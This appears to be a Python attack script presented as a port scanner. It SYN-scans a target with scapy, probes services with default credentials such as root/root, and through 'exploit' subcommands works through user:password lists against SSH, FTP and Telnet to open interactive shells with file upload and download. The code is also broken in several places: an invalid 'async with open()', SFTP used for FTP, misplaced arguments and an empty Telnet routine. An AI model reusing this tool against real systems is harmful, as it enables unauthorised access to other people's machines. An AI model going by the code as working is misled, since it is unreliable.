import asyncio, logging, argparse, paramiko, threading, sys
from scapy.all import *
from colorama import Fore, Style
from tabulate import tabulate

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

class PortScanner:
    
    def __init__(self, target, ports, max_concurrent_scans=100):
        self.target = target
        self.ports = ports
        self.open_ports = []
        self.semaphore = asyncio.Semaphore(max_concurrent_scans)
        self.protocols = {
            20: b'USER anonymous\r\n',
            21: b'USER anonymous\r\n',
            22: b'\x00' * 1,
            23: b'HELP\r\n',
            25: b'',
            80: f'GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n'.encode(),
            110: b'USER root\r\n',
        }
        self.exploits = {22: 'ssh', 21: 'ftp', 23: 'telnet'}

    def print_help_for_services(self, services):
        help_texts = {
            'ssh': f'{Fore.GREEN}Exploit options for SSH{Style.RESET_ALL}\n  exploit_file: File containing user:password pairs',
            'ftp': f'{Fore.GREEN}Exploit options for FTP{Style.RESET_ALL}\n  exploit_file: File containing user:password pairs',
            'telnet': f'{Fore.GREEN}Exploit options for Telnet{Style.RESET_ALL}\n  exploit_file: File containing user:password pairs',
        }
        for service in services:
            print(help_texts.get(service, f'{Fore.RED}No help available for service: {service}{Style.RESET_ALL}'))

    async def ssh_shell(self, ip, username='anonymous', password='anonymous', port=22):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(ip, port=port, username=username, password=password)
            channel = ssh_client.invoke_shell()
            threading.Thread(target=lambda: self.read_output(channel), daemon=True).start()
            while (command := input(f'{Fore.YELLOW}Enter command (type "exit" to quit): {Style.RESET_ALL}')).lower() != 'exit':
                channel.send(command + '\n')
        except Exception as e:
            print(f'{Fore.RED}Error: {e}{Style.RESET_ALL}')
        finally:
            ssh_client.close()

    async def ftp_shell(self, ip, exploit_file=None, username='anonymous', password='anonymous', port=21):
        if port not in self.open_ports:
            print(f'{Fore.RED}Port {port} is not open for FTP on {ip}. Aborting connection.{Style.RESET_ALL}')
            return

        successful_credentials = []
        
        try:
            ftp_client = paramiko.SFTPClient.from_transport(paramiko.Transport((ip, port)))
            ftp_client.connect(username=username, password=password)
            print(f'{Fore.MAGENTA}Connected to FTP {ip} as {username}{Style.RESET_ALL}')
            
            if exploit_file:
                async with open(exploit_file) as f:
                    for line in f:
                        username, password = line.strip().split(':')
                        try:
                            ftp_client.connect(username=username, password=password)
                            print(f'{Fore.GREEN}Successfully logged in as {username}{Style.RESET_ALL}')
                            successful_credentials.append((username, password))
                            break
                        except Exception as e:
                            print(f'{Fore.RED}Failed login for {username}: {e}{Style.RESET_ALL}')

            if successful_credentials:
                print(f'\n{Fore.CYAN}Successful Credentials:{Style.RESET_ALL}')
                print(tabulate(successful_credentials, headers=["Username", "Password"], tablefmt="pretty", stralign="center"))

            while True:
                command = input(f'{Fore.YELLOW}Enter FTP command (ls, get <file>, put <file>, exit): {Style.RESET_ALL}')
                command = command.strip().split()

                if command[0].lower() == 'exit':
                    print(f'{Fore.GREEN}Exiting FTP shell.{Style.RESET_ALL}')
                    break
                elif command[0].lower() == 'ls':
                    try:
                        files = ftp_client.listdir()
                        print(f'{Fore.CYAN}Files in directory:{Style.RESET_ALL}')
                        print('\n'.join(files))
                    except Exception as e:
                        print(f'{Fore.RED}Error listing directory: {e}{Style.RESET_ALL}')
                elif command[0].lower() == 'get' and len(command) == 2:
                    try:
                        ftp_client.get(command[1], command[1])
                        print(f'{Fore.GREEN}Downloaded {command[1]} successfully.{Style.RESET_ALL}')
                    except Exception as e:
                        print(f'{Fore.RED}Error downloading file: {e}{Style.RESET_ALL}')
                elif command[0].lower() == 'put' and len(command) == 2:
                    try:
                        ftp_client.put(command[1], command[1])
                        print(f'{Fore.GREEN}Uploaded {command[1]} successfully.{Style.RESET_ALL}')
                    except Exception as e:
                        print(f'{Fore.RED}Error uploading file: {e}{Style.RESET_ALL}')
                else:
                    print(f'{Fore.RED}Invalid command. Please use ls, get <file>, put <file>, or exit.{Style.RESET_ALL}')

        except Exception as e:
            print(f'{Fore.RED}Error: {e}{Style.RESET_ALL}')
        finally:
            ftp_client.close()

    async def telnet_shell(self, ip, username='anonymous', password='anonymous'):
        print(f'{Fore.MAGENTA}Connecting to Telnet {ip} with {username}:{password}{Style.RESET_ALL}')

    def read_output(self, channel):
        while (output := channel.recv(1024).decode('utf-8')):
            print(f'{Fore.CYAN}{output}{Style.RESET_ALL}', end='')

    async def detect_service_version(self, ip, port):
        if (request := self.protocols.get(port)):
            syn_pkt = IP(dst=ip) / TCP(dport=port, flags='S')
            syn_ack = sr1(syn_pkt, timeout=1, verbose=0)

            if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x12:
                ack_pkt = IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1)
                send(ack_pkt)

                response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1) / Raw(load=request), timeout=1, verbose=0)

                if response and hasattr(response, 'load'):
                    return response.load.decode(errors='ignore').strip()

                if port in [21, 22, 110]:
                    if port == 21:
                        user_response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1) / Raw(load=b"USER anonymous\r\n"), timeout=1, verbose=0)
                        pass_response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=user_response[TCP].seq + 1) / Raw(load=b"PASS anonymous\r\n"), timeout=1, verbose=0)
                        return f"FTP response: {pass_response.load.decode(errors='ignore') if pass_response else 'No response'}"

                    elif port == 22:
                        try:
                            syn_pkt = IP(dst=ip) / TCP(dport=port, flags='S')
                            syn_ack = sr1(syn_pkt, timeout=1, verbose=0)

                            if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x12:
                                ack_pkt = IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1)
                                send(ack_pkt)

                                response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1), timeout=1, verbose=0)
                                if response and hasattr(response, 'load'):
                                    return response.load.decode(errors='ignore').strip()

                        except Exception as e:
                            return f'SSH Error: {e}'

                    elif port == 110:
                        user_response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=syn_ack[TCP].seq + 1) / Raw(load=b"USER root\r\n"), timeout=1, verbose=0)
                        pass_response = sr1(IP(dst=ip) / TCP(dport=port, flags='A', sport=syn_ack[TCP].dport, seq=user_response[TCP].seq + 1) / Raw(load=b"PASS root\r\n"), timeout=1, verbose=0)
                        return f"POP3 response: {pass_response.load.decode(errors='ignore') if pass_response else 'No response'}"

            return 'Service detected but no specific response'

        return 'Unknown or unresponsive service'

    async def scan_port(self, port):
        async with self.semaphore:
            pkt = IP(dst=self.target) / TCP(dport=port, flags='S')
            response = sr1(pkt, timeout=0.01, verbose=0)
            if response and response.haslayer(TCP) and response[TCP].flags == 0x12:
                self.open_ports.append(port)
                send(IP(dst=self.target) / TCP(dport=port, flags='R'))

                version = await self.detect_service_version(self.target, port)
                if "Unknown or unresponsive service" in version:
                    print(f'{Fore.GREEN}Open port found: {port}, Service Version: {version}{Style.RESET_ALL}')
                    print(f'{Fore.CYAN}Full Response: {version}{Style.RESET_ALL}')
                else:
                    print(f'{Fore.GREEN}Open port found: {port}, Service Version: {version}{Style.RESET_ALL}')

    def scan_ports_in_thread(self, port):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.scan_port(port))

    async def scan_ports(self):
        print(f'{Fore.YELLOW}Scanning {self.target} for open TCP Ports: {len(self.ports)}{Style.RESET_ALL}')
        tasks = [self.scan_port(port) for port in self.ports]
        await asyncio.gather(*tasks)

    async def report_open_ports(self):
        if self.open_ports:
            results = []
            for port in self.open_ports:
                version = await self.detect_service_version(self.target, port)
                results.append([port, version])
            print(f'{Fore.GREEN}Open Ports Found:{Style.RESET_ALL}')
            print(tabulate(results, headers=["Port", "Service Version"], tablefmt="pretty", stralign="center"))
        else:
            print(f'{Fore.RED}No open ports found.{Style.RESET_ALL}')

    async def exploit(self, exploit_service, exploit_file):
        if exploit_service and exploit_file:
            async with open(exploit_file) as f:
                for line in f:
                    username, password = line.strip().split(':')
                    if exploit_service == 'ssh':
                        await self.ssh_shell(self.target, username, password)
                    elif exploit_service == 'ftp':
                        await self.ftp_shell(self.target, username, password)
                    elif exploit_service == 'telnet':
                        await self.telnet_shell(self.target, username, password)

def parse_ports(ports_str):
    ports = []
    for part in ports_str.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports

async def main(target, ports, exploit_service, exploit_file):
    scanner = PortScanner(target, ports)
    await scanner.scan_ports()
    await scanner.report_open_ports()
    await scanner.exploit(exploit_service, exploit_file)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f'{Fore.CYAN}Asynchronous Port Scanner{Style.RESET_ALL}')
    
    parser.add_argument('target', type=str, help=f'{Fore.YELLOW}Target IP or hostname{Style.RESET_ALL}')
    parser.add_argument('ports', type=str, help=f'{Fore.YELLOW}Comma-separated list of ports or ranges (e.g., 80 or 80,81,82 or 1-65535){Style.RESET_ALL}')
    parser.add_argument('--max_concurrent_scans', type=int, default=100, help=f'{Fore.YELLOW}Maximum concurrent scans (default: 100){Style.RESET_ALL}')
    
    subparsers = parser.add_subparsers(dest='exploit_service', required=False, help=f'{Fore.MAGENTA}Exploit service type (use -h for subcommand help){Style.RESET_ALL}')
    
    ssh_parser = subparsers.add_parser('ssh', help=f'{Fore.GREEN}Exploit options for SSH{Style.RESET_ALL}')
    ssh_parser.add_argument('exploit_file', type=str, help=f'{Fore.YELLOW}File containing user:password pairs{Style.RESET_ALL}')

    ftp_parser = subparsers.add_parser('ftp', help=f'{Fore.GREEN}Exploit options for FTP{Style.RESET_ALL}')
    ftp_parser.add_argument('exploit_file', type=str, help=f'{Fore.YELLOW}File containing user:password pairs{Style.RESET_ALL}')

    telnet_parser = subparsers.add_parser('telnet', help=f'{Fore.GREEN}Exploit options for Telnet{Style.RESET_ALL}')
    telnet_parser.add_argument('exploit_file', type=str, help=f'{Fore.YELLOW}File containing user:password pairs{Style.RESET_ALL}')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    ports = parse_ports(args.ports)
    exploit_file = getattr(args, 'exploit_file', None)
    asyncio.run(main(args.target, ports, args.exploit_service, exploit_file))
